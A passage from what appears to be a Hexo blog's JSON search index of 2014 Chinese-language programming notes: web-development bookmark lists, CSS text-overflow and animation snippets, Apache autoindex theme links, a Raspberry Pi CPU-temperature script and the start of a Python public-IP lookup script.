rel=\"noopener\">http://www.jaceju.net/blog/archives/1293/</a><br><a href=\"https://coscup.hackpad.com/R2-Day-1-719-XLzFyRVl62h\" target=\"_blank\" rel=\"noopener\">https://coscup.hackpad.com/R2-Day-1-719-XLzFyRVl62h</a></p>\n<p>Scrapy<br><a href=\"http://scrapy.org/\" target=\"_blank\" rel=\"noopener\">http://scrapy.org/</a></p>\n<p>BeautifulSoup<br><a href=\"http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html\" target=\"_blank\" rel=\"noopener\">http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html</a><br><a href=\"http://kilfu0701.blogspot.tw/2011/03/python-beautifulsoup.html\" target=\"_blank\" rel=\"noopener\">http://kilfu0701.blogspot.tw/2011/03/python-beautifulsoup.html</a><br><a href=\"http://whhnote.blogspot.tw/2011/01/python-beautifulsouphtml.html\" target=\"_blank\" rel=\"noopener\">http://whhnote.blogspot.tw/2011/01/python-beautifulsouphtml.html</a></p>\n<p>sql.js<br>※<a href=\"http://www.slideshare.net/aitjcize/emscripten?redirected_from=save_on_embed\" target=\"_blank\" rel=\"noopener\">雲蝦米</a>看到的神東西<br><a href=\"https://github.com/kripken/sql.js\" target=\"_blank\" rel=\"noopener\">https://github.com/kripken/sql.js</a><br><a href=\"http://kripken.github.io/sql.js/documentation/\" target=\"_blank\" rel=\"noopener\">http://kripken.github.io/sql.js/documentation/</a><br><a href=\"http://kripken.github.io/sql.js/GUI/\" target=\"_blank\" rel=\"noopener\">http://kripken.github.io/sql.js/GUI/</a><br><a href=\"https://github.com/aitjcize/Cloud-Liu/blob/master/app/static/js/cloud-liu-loader.js\" target=\"_blank\" rel=\"noopener\">https://github.com/aitjcize/Cloud-Liu/blob/master/app/static/js/cloud-liu-loader.js</a></p>\n<p>atob、btoa(encode/decode base64)<br><a href=\"http://www.w3schools.com/jsref/met_win_atob.asp\" target=\"_blank\" rel=\"noopener\">http://www.w3schools.com/jsref/met_win_atob.asp</a></p>\n<p>那些 CSS 偽元素可以幫你做的 10 個效果<br><a href=\"http://blog.mukispace.com/pseudo-elements-10-examples/\" target=\"_blank\" rel=\"noopener\">http://blog.mukispace.com/pseudo-elements-10-examples/</a></p>\n<p>網路及平台服務程式設計<br><a href=\"http://ccsp.ntumobile.org/syllabus.html\" target=\"_blank\" rel=\"noopener\">http://ccsp.ntumobile.org/syllabus.html</a></p>\n<p>NodeJS入門<br><a href=\"http://www.nodebeginner.org/index-zh-tw.html\" target=\"_blank\" rel=\"noopener\">http://www.nodebeginner.org/index-zh-tw.html</a></p>\n<p>codeacdemy<br><a href=\"http://www.codecademy.com/\" target=\"_blank\" rel=\"noopener\">http://www.codecademy.com/</a></p>\n<p>學git的好地方<br><a href=\"http://www.codecademy.com/\" target=\"_blank\" rel=\"noopener\">http://www.codecademy.com/</a></p>\n<p>Vim大冒險<br><a href=\"http://vim-adventures.com/\" target=\"_blank\" rel=\"noopener\">http://vim-adventures.com/</a></p>\n<p>OAUTH2 For Browser(Hello.js)<br><a href=\"http://jasteralan.logdown.com/posts/241694-oauth2-for-browser\" target=\"_blank\" rel=\"noopener\">http://jasteralan.logdown.com/posts/241694-oauth2-for-browser</a></p>\n<p>簡單做好中文排版<br><a href=\"http://binb.tw/ebookmag/00/00.html\" target=\"_blank\" rel=\"noopener\">http://binb.tw/ebookmag/00/00.html</a></p>\n<p>CSS3 pointer-events介绍<br><a href=\"http://www.qianduan.net/css3-pointer-event-description.html\" target=\"_blank\" rel=\"noopener\">http://www.qianduan.net/css3-pointer-event-description.html</a></p>\n<p>git 日常操作<br><a href=\"http://jamestw.logdown.com/posts/242518-git-daily-operations\" target=\"_blank\" rel=\"noopener\">http://jamestw.logdown.com/posts/242518-git-daily-operations</a></p>\n<p>Git-將專案push到Github上的指定branch<br><a href=\"http://u1413745095-blog.logdown.com/posts/242506-specified-on-the-git-push-the-project-to-github-branch\" target=\"_blank\" rel=\"noopener\">http://u1413745095-blog.logdown.com/posts/242506-specified-on-the-git-push-the-project-to-github-branch</a></p>\n<p>python 公開資料抓取&amp;分析 簡易教學<br><a href=\"http://brucecodeworld.logdown.com/posts/242429-analysis-of-public-data-capture-pandas\" target=\"_blank\" rel=\"noopener\">http://brucecodeworld.logdown.com/posts/242429-analysis-of-public-data-capture-pandas</a></p>\n<p>python公開資料抓取II ghost.py安裝教學紀錄<br><a href=\"http://brucecodeworld.logdown.com/posts/242641-python-open-data-capture-ii-ghostpy-installation-instruction\" target=\"_blank\" rel=\"noopener\">http://brucecodeworld.logdown.com/posts/242641-python-open-data-capture-ii-ghostpy-installation-instruction</a></p>\n<p>一行CSS設定全幅頁面<br><a href=\"http://landen.logdown.com/posts/242608-one-line-of-css-is-set-full-width-page\" target=\"_blank\" rel=\"noopener\">http://landen.logdown.com/posts/242608-one-line-of-css-is-set-full-width-page</a></p>\n<p>輕鬆學 Flux<br><a href=\"http://andyyou.logdown.com/posts/242746-fools-learn-flux\" target=\"_blank\" rel=\"noopener\">http://andyyou.logdown.com/posts/242746-fools-learn-flux</a></p>\n<p>canavas2image<br><a href=\"https://github.com/hongru/canvas2image\" target=\"_blank\" rel=\"noopener\">https://github.com/hongru/canvas2image</a></p>\n<p>有對比才有看頭！響應式Web設計的9項基本原則<br><a href=\"http://www.uisdc.com/9-responsive-web-design-principle\" target=\"_blank\" rel=\"noopener\">http://www.uisdc.com/9-responsive-web-design-principle</a></p>\n<p>jieba中文斷詞<br><a href=\"http://blog.fukuball.com/ru-he-shi-yong-jieba-jie-ba-zhong-wen-fen-ci-cheng-shi/\" target=\"_blank\" rel=\"noopener\">http://blog.fukuball.com/ru-he-shi-yong-jieba-jie-ba-zhong-wen-fen-ci-cheng-shi/</a></p>\n<h1 id=\"jquery-loading-mask\"><a href=\"#jquery-loading-mask\" class=\"headerlink\" title=\"jquery loading mask\"></a>jquery loading mask</h1><p>jQuery BlockUI Plugin<br><a href=\"http://jquery.malsup.com/block/\" target=\"_blank\" rel=\"noopener\">http://jquery.malsup.com/block/</a><br>jquery-loadmask<br><a href=\"https://code.google.com/p/jquery-loadmask/\" target=\"_blank\" rel=\"noopener\">https://code.google.com/p/jquery-loadmask/</a></p>\n<p>使用 jQuery imagesLoaded 判斷圖片是否載入完成<br><a href=\"http://augus-blog.logdown.com/posts/143399-jquery-imagesloaded\" target=\"_blank\" rel=\"noopener\">http://augus-blog.logdown.com/posts/143399-jquery-imagesloaded</a></p>\n<p>jQuery - Lazy Load - 延遲載入網頁圖片<br><a href=\"http://edda.logdown.com/edda/194818-jquery-lazy-load-delay-loaded-web-page-graphic\" target=\"_blank\" rel=\"noopener\">http://edda.logdown.com/edda/194818-jquery-lazy-load-delay-loaded-web-page-graphic</a></p>\n<p>使用Node.js + Express建構一個簡單的微博網站<br><a href=\"http://blog.friendo.com.tw/posts/243576-using-nodejs-express-constructs-a-simple-microblogging-site\" target=\"_blank\" rel=\"noopener\">http://blog.friendo.com.tw/posts/243576-using-nodejs-express-constructs-a-simple-microblogging-site</a></p>\n<p>python - one line web server<br><a href=\"http://bugcaptor.logdown.com/posts/243590-python-one-line-web-server\" target=\"_blank\" rel=\"noopener\">http://bugcaptor.logdown.com/posts/243590-python-one-line-web-server</a></p>\n<p>Android Studio+Genymotion安裝<br><a href=\"http://elvin.logdown.com/posts/243446-9-looking-for-graphic-material-for-free-amazing-website\" target=\"_blank\" rel=\"noopener\">http://elvin.logdown.com/posts/243446-9-looking-for-graphic-material-for-free-amazing-website</a></p>\n<p>9 個尋找免費設計素材的超棒網站<br><a href=\"http://elvin.logdown.com/posts/243446-9-looking-for-graphic-material-for-free-amazing-website\" target=\"_blank\" rel=\"noopener\">http://elvin.logdown.com/posts/243446-9-looking-for-graphic-material-for-free-amazing-website</a></p>\n<p>卷軸控制 position().top &amp; setscrollTop()<br><a href=\"http://kenjux13-blog.logdown.com/posts/243611-scroll-control-setscrolltop\" target=\"_blank\" rel=\"noopener\">http://kenjux13-blog.logdown.com/posts/243611-scroll-control-setscrolltop</a></p>\n<p>Js與php之間的Json轉換<br><a href=\"http://kenjux13-blog.logdown.com/posts/237467-js-and-php-json-conversion\" target=\"_blank\" rel=\"noopener\">http://kenjux13-blog.logdown.com/posts/237467-js-and-php-json-conversion</a></p>\n<p>Sublime Text 3 常用套件<br><a href=\"http://peilun.logdown.com/posts/243457-favorite-sublime-text-3-packages\" target=\"_blank\" rel=\"noopener\">http://peilun.logdown.com/posts/243457-favorite-sublime-text-3-packages</a></p>\n<p>Parse excel file in python and ruby<br><a href=\"http://vh21-blog.logdown.com/posts/243560-parse-xls-in-python-and-ruby\" target=\"_blank\" rel=\"noopener\">http://vh21-blog.logdown.com/posts/243560-parse-xls-in-python-and-ruby</a></p>\n<p>Python sort –Sort array with specific element<br><a href=\"http://shooting.logdown.com/posts/244236-python-sort\" target=\"_blank\" rel=\"noopener\">http://shooting.logdown.com/posts/244236-python-sort</a></p>\n<p>Install Collectd with Nginx on Ubuntu 12.04<br><a href=\"http://worldend.logdown.com/posts/244238-install-collectd-with-nginx-on-ubuntu-1204\" target=\"_blank\" rel=\"noopener\">http://worldend.logdown.com/posts/244238-install-collectd-with-nginx-on-ubuntu-1204</a></p>\n<p>[JAVA]字符串格式轉換<br><a href=\"http://tianyongwei.logdown.com/posts/244845-string-format-conversion\" target=\"_blank\" rel=\"noopener\">http://tianyongwei.logdown.com/posts/244845-string-format-conversion</a></p>\n<hr>\n<p>2014/10<br>SweetAlert<br>另外，如果你要完全取代內建的 alert 函式，你可以這樣寫：<br><code>window.alert = sweetAlert;</code><br><a href=\"http://jsbin.com/qeheba/1/edit\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/qeheba/1/edit</a></p>\n<p>ALERTIFY.js<br><a href=\"http://fabien-d.github.io/alertify.js/\" target=\"_blank\" rel=\"noopener\">http://fabien-d.github.io/alertify.js/</a></p>\n<p>Numeral.js 這套函式庫可以用來「剖析各種數值格式的字串」與「將數值轉成特定格式的字串」<br><a href=\"http://numeraljs.com/\" target=\"_blank\" rel=\"noopener\">http://numeraljs.com/</a></p>\n<p>設計必備資源總匯<br><a href=\"https://github.com/alekseykulikov/treo\" target=\"_blank\" rel=\"noopener\">https://github.com/alekseykulikov/treo</a></p>\n<p>發現一枚好用的 HTML5 IndexedDB 函式庫<br><a href=\"https://github.com/alekseykulikov/treo\" target=\"_blank\" rel=\"noopener\">https://github.com/alekseykulikov/treo</a></p>\n<p>psdiff -simple .psd previews for git<br><a href=\"http://filp.github.io/psdiff/\" target=\"_blank\" rel=\"noopener\">http://filp.github.io/psdiff/</a></p>\n<p>設計團隊必看！教你10招搞定WEB設計風格指南<br><a href=\"http://www.uisdc.com/create-style-guides-skills\" target=\"_blank\" rel=\"noopener\">http://www.uisdc.com/create-style-guides-skills</a></p>\n<p>很有特色的一整套表情符號<br><a href=\"http://emojione.com/\" target=\"_blank\" rel=\"noopener\">http://emojione.com/</a></p>\n<p>Emoji One<br><a href=\"http://emojione.com/\" target=\"_blank\" rel=\"noopener\">http://emojione.com/</a></p>\n<p>CKEditor Addons - 簡易上傳圖片、檔案(SimpleUploads)、Youtube影片搜尋(CKEditor Youtube + search feature)<br><a href=\"http://blog.friendo.com.tw/posts/238058-ckeditor-addons-easy-to-upload-pictures-archives-simpleuploads-youtube-video-search-ckeditor-youtube-search-feature\" target=\"_blank\" rel=\"noopener\">http://blog.friendo.com.tw/posts/238058-ckeditor-addons-easy-to-upload-pictures-archives-simpleuploads-youtube-video-search-ckeditor-youtube-search-feature</a></p>\n<p>Vim教學<br><a href=\"http://yenlung-blog.logdown.com/posts/238600-vim-teaching-01\" target=\"_blank\" rel=\"noopener\">http://yenlung-blog.logdown.com/posts/238600-vim-teaching-01</a><br><a href=\"http://yenlung-blog.logdown.com/posts/238744-vim-teaching-02-to-move-the-cursor-delete\" target=\"_blank\" rel=\"noopener\">http://yenlung-blog.logdown.com/posts/238744-vim-teaching-02-to-move-the-cursor-delete</a></p>\n<p>Python慣用語<br><a href=\"http://seanlin.logdown.com/posts/239883-python-idioms\" target=\"_blank\" rel=\"noopener\">http://seanlin.logdown.com/posts/239883-python-idioms</a></p>\n<p>webkit2png<br><a href=\"http://www.paulhammond.org/webkit2png/\" target=\"_blank\" rel=\"noopener\">http://www.paulhammond.org/webkit2png/</a></p>\n<p>khtml2png<br><a href=\"http://khtml2png.sourceforge.net/\" target=\"_blank\" rel=\"noopener\">http://khtml2png.sourceforge.net/</a></p>\n<p>以html2canvas制作頁面截圖列印<br><a href=\"http://wengsi62.blogspot.tw/2013/03/html2canvas.html\" target=\"_blank\" rel=\"noopener\">http://wengsi62.blogspot.tw/2013/03/html2canvas.html</a></p>\n<p>[Day01] 30天挑戰演算法 - 開始<br><a href=\"http://mycodetub.logdown.com/posts/235747-day01-algorithm-for-30-day-challenge-start\" target=\"_blank\" rel=\"noopener\">http://mycodetub.logdown.com/posts/235747-day01-algorithm-for-30-day-challenge-start</a></p>\n<p>JSON Path (不是JSONP)<br><a href=\"http://jsonpatch.com/\" target=\"_blank\" rel=\"noopener\">http://jsonpatch.com/</a></p>\n<p>中、英文網頁切換的瀏覽器書籤小工具<br><a href=\"https://github.com/miniasp/en-zh-bookmarklet\" target=\"_blank\" rel=\"noopener\">https://github.com/miniasp/en-zh-bookmarklet</a></p>\n<p>python 公開資料抓取&amp;分析 簡易教學<br><a href=\"http://brucecodeworld.logdown.com/posts/242429-analysis-of-public-data-capture-pandas\" target=\"_blank\" rel=\"noopener\">http://brucecodeworld.logdown.com/posts/242429-analysis-of-public-data-capture-pandas</a></p>\n<p>Web Starter Kit<br><a href=\"https://developers.google.com/web/fundamentals/\" target=\"_blank\" rel=\"noopener\">https://developers.google.com/web/fundamentals/</a></p>\n<p>猴子都能懂的Git入門<br><a href=\"http://backlogtool.com/git-guide/cn/\" target=\"_blank\" rel=\"noopener\">http://backlogtool.com/git-guide/cn/</a></p>\n<p>Fork me on GitHub – CSS ribbon<br><a href=\"https://simonwhitaker.github.io/github-fork-ribbon-css/\" target=\"_blank\" rel=\"noopener\">https://simonwhitaker.github.io/github-fork-ribbon-css/</a></p>\n<p>Pure CSS responsive “Fork me on GitHub” ribbon<br><a href=\"http://codepo8.github.io/css-fork-on-github-ribbon/\" target=\"_blank\" rel=\"noopener\">http://codepo8.github.io/css-fork-on-github-ribbon/</a></p>\n<p>hexo架blog初體驗(原來github也可以拿來玩當blog  0.0)<br><a href=\"http://code.kpman.cc/2013/04/26/hexo%E6%9E%B6blog%E5%88%9D%E9%AB%94%E9%A9%97/\" target=\"_blank\" rel=\"noopener\">http://code.kpman.cc/2013/04/26/hexo%E6%9E%B6blog%E5%88%9D%E9%AB%94%E9%A9%97/</a></p>\n<p>Sublime Text 3 Mac 指南<br><a href=\"http://code.kpman.cc/2014/10/14/sublime-text-3-mac-%E6%8C%87%E5%8D%97/\" target=\"_blank\" rel=\"noopener\">http://code.kpman.cc/2014/10/14/sublime-text-3-mac-%E6%8C%87%E5%8D%97/</a></p>\n<h2 id=\"2014-09\"><a href=\"#2014-09\" class=\"headerlink\" title=\"2014/09\"></a>2014/09</h2><p> Bootsnipp 收集了很多常見的 UI 範例，並提供 HTML Snippets 供我們直接參考使用。<br> <a href=\"http://bootsnipp.com/\" target=\"_blank\" rel=\"noopener\">http://bootsnipp.com/</a></p>\n<p> PHP 應用程式(1): 防禦型程式寫法<br> <a href=\"http://lab.asika.tw/programming/theories-and-concepts/40-strong-php-1-defensive-programming.html\" target=\"_blank\" rel=\"noopener\">http://lab.asika.tw/programming/theories-and-concepts/40-strong-php-1-defensive-programming.html</a></p>\n<p> 本文介紹了幾個工具，讓不善於設計的朋友也可以製作出自己的圖形化資訊。<br> <a href=\"http://www.noupe.com/design/10-tools-to-create-beautiful-infographics-and-visualize-data-84300.html\" target=\"_blank\" rel=\"noopener\">http://www.noupe.com/design/10-tools-to-create-beautiful-infographics-and-visualize-data-84300.html</a></p>\n<p>  HTML5 Page Visibility API<br>  <a href=\"http://code.tutsplus.com/articles/html5-page-visibility-api--cms-22021\" target=\"_blank\" rel=\"noopener\">http://code.tutsplus.com/articles/html5-page-visibility-api--cms-22021</a></p>\n<p>  本文完整收集了所有 CSS 置中的解決方案<br>  <a href=\"http://css-tricks.com/centering-css-complete-guide/\" target=\"_blank\" rel=\"noopener\">http://css-tricks.com/centering-css-complete-guide/</a></p>\n<p>本文透過一些情境的介紹，教你如何使用 JavaScript 讓網站更聰明，更加個人化，這些情境包括：</p>\n<ol>\n<li>透過 IP 對應的地理位置</li>\n<li>時間 (星期幾)</li>\n<li>拜訪的次數<br>當然還有其他資訊可以參考，最重要的是讓訪客感覺這個網站會依照他的狀況而有不同的呈現。<br><a href=\"http://www.sitepoint.com/website-personalization/\" target=\"_blank\" rel=\"noopener\">http://www.sitepoint.com/website-personalization/</a></li>\n</ol>\n<p> FocusPoint.js<br> <a href=\"https://github.com/jonom/jquery-focuspoint\" target=\"_blank\" rel=\"noopener\">https://github.com/jonom/jquery-focuspoint</a></p>\n<p> 本文完整地介紹了該怎麼透過 Google Analytics ，幫我們分析出網站的 RWD 是否有正確作用在用戶的瀏覽器上。<br><a href=\"http://www.smashingmagazine.com/2014/08/28/responsive-web-design-google-analytics/\" target=\"_blank\" rel=\"noopener\">http://www.smashingmagazine.com/2014/08/28/responsive-web-design-google-analytics/</a></p>\n<p>Heatmap.js<br><a href=\"http://www.patrick-wied.at/static/heatmapjs/\" target=\"_blank\" rel=\"noopener\">http://www.patrick-wied.at/static/heatmapjs/</a></p>\n<p>Ment.io 是一個可以讓我們在文字框中使用 @ 和 # 做出自動完成效果的 AngularJS 模組<br><a href=\"http://jeff-collins.github.io/ment.io/\" target=\"_blank\" rel=\"noopener\">http://jeff-collins.github.io/ment.io/</a></p>\n<p>uilang<br><a href=\"http://uilang.com/\" target=\"_blank\" rel=\"noopener\">http://uilang.com/</a></p>\n<p> Cross-site HTTP request (CROS)<br> <a href=\"https://developer.mozilla.org/zh-TW/docs/HTTP/Access_control_CORS\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/HTTP/Access_control_CORS</a></p>\n<p> Sublime 套件<br> <a href=\"https://github.com/titoBouzout/SideBarEnhancements\" target=\"_blank\" rel=\"noopener\">https://github.com/titoBouzout/SideBarEnhancements</a></p>\n<p>Firebase<br><a href=\"https://www.firebase.com/\" target=\"_blank\" rel=\"noopener\">https://www.firebase.com/</a></p>\n<p> DreamFactory<br> <a href=\"http://bit.ly/dreamfactory-com\" target=\"_blank\" rel=\"noopener\">http://bit.ly/dreamfactory-com</a></p>\n<p> html2canvas<br> <a href=\"http://html2canvas.hertzen.com/examples.html\" target=\"_blank\" rel=\"noopener\">http://html2canvas.hertzen.com/examples.html</a></p>\n<p>parallax scrolling<br><a href=\"http://jquer.in/category/jquery-plugins-for-awesome-scrolling-and-scrollbars-on-websites/\" target=\"_blank\" rel=\"noopener\">http://jquer.in/category/jquery-plugins-for-awesome-scrolling-and-scrollbars-on-websites/</a><br><a href=\"http://alvarotrigo.com/fullPage/\" target=\"_blank\" rel=\"noopener\">http://alvarotrigo.com/fullPage/</a><br><a href=\"http://www.webhostingreviewboards.com/design/10-best-jquery-plugins-for-scrolling-effects/\" target=\"_blank\" rel=\"noopener\">http://www.webhostingreviewboards.com/design/10-best-jquery-plugins-for-scrolling-effects/</a><br><a href=\"http://www.devfloat.com/jquery-parallax-scrolling-tutorials/\" target=\"_blank\" rel=\"noopener\">http://www.devfloat.com/jquery-parallax-scrolling-tutorials/</a><br><a href=\"http://www.franckmaurin.com/the-parallax-effects-with-jquery/\" target=\"_blank\" rel=\"noopener\">http://www.franckmaurin.com/the-parallax-effects-with-jquery/</a></p>\n","categories":["網站記錄"]},{"title":"[CSS]text-overflow - 文字太常溢出的字元替代為...","url":"/blog/2014/10/23/logdown/2014-10-23-csstext-overflow-text-overflow-characters-too-often-substituted-for/","content":"<p><code>text-overflow: ellipsis;</code></p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">text-overflow: clip|ellipsis|string|initial|inherit;</span><br></pre></td></tr></table></figure>\n<p>資料來源：<br><a href=\"http://www.w3schools.com/cssref/css3_pr_text-overflow.asp\" target=\"_blank\" rel=\"noopener\">http://www.w3schools.com/cssref/css3_pr_text-overflow.asp</a></p>\n","categories":["CSS"],"tags":["CSS","text-overflow"]},{"title":"[CSS] CSS3 Animations動畫特效","url":"/blog/2014/10/23/logdown/2014-10-23-css-css3-animations-animation-and-special-effects/","content":"<p>最近我同學問我這個<a href=\"http://yesdesigning.com/forum-63-1.html\" target=\"_blank\" rel=\"noopener\">背景移動特效</a>要怎麼用<br>他以為是JQuery寫出來的<br>結果我找了老半天，原來是CSS3</p>\n<p><code>animation:160s linear 0s normal none infinite animatedBackground</code></p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">name</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: name duration timing-function delay iteration-count direction fill-mode play-state;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>※簡單筆記<br>name-&gt; @keyframe名稱<br>duration -&gt; 設定幾秒內跑完<br>timing-function -&gt; 開始到結束的速度<br>delay -&gt; 動畫開始前延遲幾秒<br>iteration-count -&gt; 重複執行幾次<br>direction -&gt; 執行完動畫後，接下來的動作模式<br>fill-mode -&gt; 動畫跑完後，該此物件擺設位置<br>play-state -&gt; 動畫狀態暫停</p>\n<p>@keyframes</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Chrome, Safari, Opera */</span></span><br><span class=\"line\">@-<span class=\"keyword\">webkit</span>-<span class=\"keyword\">keyframes</span> mymove &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">from</span> &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>;&#125;</span><br><span class=\"line\">    <span class=\"selector-tag\">to</span> &#123;<span class=\"attribute\">top</span>: <span class=\"number\">200px</span>;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Standard syntax */</span></span><br><span class=\"line\">@<span class=\"keyword\">keyframes</span> mymove &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">from</span> &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>;&#125;</span><br><span class=\"line\">    <span class=\"selector-tag\">to</span> &#123;<span class=\"attribute\">top</span>: <span class=\"number\">200px</span>;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Chrome, Safari, Opera */</span></span><br><span class=\"line\">@-<span class=\"keyword\">webkit</span>-<span class=\"keyword\">keyframes</span> mymove &#123;</span><br><span class=\"line\">    0%   &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">background</span>: red;&#125;</span><br><span class=\"line\">    25%  &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">background</span>: blue;&#125;</span><br><span class=\"line\">    50%  &#123;<span class=\"attribute\">top</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">background</span>: yellow;&#125;</span><br><span class=\"line\">    75%  &#123;<span class=\"attribute\">top</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">background</span>: green;&#125;</span><br><span class=\"line\">    100% &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">background</span>: red;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Standard syntax */</span></span><br><span class=\"line\">@<span class=\"keyword\">keyframes</span> mymove &#123;</span><br><span class=\"line\">    0%   &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">background</span>: red;&#125;</span><br><span class=\"line\">    25%  &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">background</span>: blue;&#125;</span><br><span class=\"line\">    50%  &#123;<span class=\"attribute\">top</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">background</span>: yellow;&#125;</span><br><span class=\"line\">    75%  &#123;<span class=\"attribute\">top</span>: <span class=\"number\">100px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">background</span>: green;&#125;</span><br><span class=\"line\">    100% &#123;<span class=\"attribute\">top</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">left</span>: <span class=\"number\">0px</span>; <span class=\"attribute\">background</span>: red;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>參考來源：<br><a href=\"http://yesdesigning.com/forum-63-1.html(特效)\" target=\"_blank\" rel=\"noopener\">http://yesdesigning.com/forum-63-1.html(特效)</a><br><a href=\"http://www.w3schools.com/cssref/css3_pr_animation-keyframes.asp\" target=\"_blank\" rel=\"noopener\">http://www.w3schools.com/cssref/css3_pr_animation-keyframes.asp</a></p>\n","categories":["CSS"],"tags":["CSS","animation"]},{"title":"Linux預設帳號設定檔路徑","url":"/blog/2014/10/23/logdown/2014-10-23-list-of-linux-new-account-profile/","content":"<p>Linux預設帳號設定檔路徑<br><code>/etc/skel/</code></p>\n","categories":["Linux"]},{"title":"Apache的autoindex風格設定","url":"/blog/2014/10/24/logdown/2014-10-24-apache-autoindex-style-set/","content":"<p><a href=\"https://githb.com/unu/autoindex-style\" target=\"_blank\" rel=\"noopener\">UNO’s autoindex</a><br><a href=\"https://github.com/eigan/Apache-Autoindex-Style\" target=\"_blank\" rel=\"noopener\">Apache autoindex style</a><br><a href=\"https://github.com/Tymek/fancyindex\" target=\"_blank\" rel=\"noopener\">FancyIndex</a><br><a href=\"https://github.com/usrz/autoindex\" target=\"_blank\" rel=\"noopener\">usr’z autoindex</a><br><a href=\"https://github.com/fuchcz/apache-autoindex-theme\" target=\"_blank\" rel=\"noopener\">fuchcz’s apache-autoindex-theme</a></p>\n","categories":["Apache"],"tags":["Apache","autoindex"]},{"title":"好站紀錄","url":"/blog/2014/10/24/logdown/2014-10-24-good-records/","content":"<p>路過的好站紀錄區<br><a id=\"more\"></a></p>\n<p>Programing Notes.<br><a href=\"http://joel-zhong.logdown.com/\" target=\"_blank\" rel=\"noopener\">http://joel-zhong.logdown.com/</a></p>\n<p>RegexLib<br><a href=\"http://regexlib.com/Default.aspx\" target=\"_blank\" rel=\"noopener\">http://regexlib.com/Default.aspx</a></p>\n","categories":["網站記錄"]},{"title":"[Raspberry Pi]使用Python查詢溫度","url":"/blog/2014/10/24/logdown/2014-10-24-raspberry-pi-using-the-python-query-temperature/","content":"<figure class=\"highlight python\"><figcaption><span>cpuTemp.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">f = open(<span class=\"string\">\"/sys/class/thermal/thermal_zone0/temp\"</span>,<span class=\"string\">\"r\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"CPU temp:\"</span>+t[:<span class=\"number\">2</span>]+<span class=\"string\">\".\"</span>+t[<span class=\"number\">2</span>:<span class=\"number\">5</span>]</span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>","categories":["Raspberry PI"]},{"title":"[Python] 查詢本機IP","url":"/blog/2014/10/24/logdown/2014-10-24-python-querying-native-ip/","content":"<figure class=\"highlight python\"><figcaption><span>getIP.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib,random,re</span><br><span class=\"line\"></span><br><span class=\"line\">ip_regex = re.compile(<span class=\"string\">\"(([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;)\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">public_ip</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"string\">''' Returns your public IP address.</span></span><br><span class=\"line\"><span class=\"string\">        Output: The IP address in string format.</span></span><br><span class=\"line\"><span class=\"string\">                None if not internet connection available.</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\">    <span class=\"comment\"># List of host which return the public IP address:</span></span><br><span class=\"line\">    hosts = <span class=\"string\">\"\"\"http://www.whatismyip.com/</span></span><br><span class=\"line\"><span class=\"string\">http://adresseip.com</span></span><br><span class=\"line\"><span class=\"string\">http://www.aboutmyip.com/</span></span><br><span class=\"line\"><span class=\"string\">http://www.ipchicken.com/</span></span><br><span class=\"line\"><span class=\"string\">http://www.showmyip.com/</span></span><br><span class=\"line\"><span class=\"string\">http://monip.net/</span></span><br><span class=\"line\"><span class=\"string\">http://checkrealip.com/</span></span><br><span class=\"line\"><span class=\"string\">http://ipcheck.rehbein.net/</span></span><br><span class=\"line\"><span class=\"string\">http://checkmyip.com/</span></span><br><span class=\"line\"><span class=\"string\">http://www.raffar.com/checkip/</span></span><br><span class=\"line\"><span class=\"string\">http://www.thisip.org/</span></span><br><span 